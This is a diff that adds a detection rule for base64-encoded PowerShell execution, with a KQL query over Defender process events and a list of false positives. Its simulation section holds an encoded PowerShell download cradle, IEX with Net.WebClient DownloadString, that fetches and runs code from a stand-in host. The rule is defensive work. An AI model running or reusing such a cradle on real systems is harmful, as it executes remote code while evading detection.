@@ -1,1 +1,48 @@
+# Encoded PowerShell Execution
+# MITRE ATT&CK: T1059.001 - PowerShell
+# Author: Isaac Amoussou-Kpakpa
+# Created: 2026-04
 
+title: Encoded PowerShell Execution
+id: t1059.001-encoded-powershell
+status: experimental
+description: |
+  Detects PowerShell execution with base64-encoded commands. Attackers encode
+  commands to evade signature-based detection and hide malicious payloads.
+  This detection extracts and decodes the base64 payload for analysis.
+
+references:
+  - https://attack.mitre.org/techniques/T1059/001/
+
+tags:
+  - attack.execution
+  - attack.t1059.001
+
+logsource:
+  product: microsoft_defender_endpoint
+  service: DeviceProcessEvents
+
+detection:
+  query: |
+    let TimeWindow = 1h;
+    DeviceProcessEvents
+    | where Timestamp >= ago(TimeWindow)
+    | where ProcessCommandLine has_any ("-enc", "-encoded", "-e")
+    | extend EncodedCommand = extract("-enc\\s+([A-Za-z0-9+/=]+)", 1, ProcessCommandLine)
+    | extend DecodedCommand = base64_decode_tostring(EncodedCommand)
+    | project Timestamp, AccountName, DeviceName, EncodedCommand, DecodedCommand
+
+  timeframe: 1h
+
+falsepositives:
+  - Legitimate admin scripts using encoding for special characters
+  - Some enterprise software deployment tools
+  - SCCM/Intune scripts
+
+level: high
+
+simulation:
+  tool: PowerShell
+  command: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACcAKQA=
+  platform: Windows target VM
+  notes: Encoded command is IEX (New-Object Net.WebClient).DownloadString
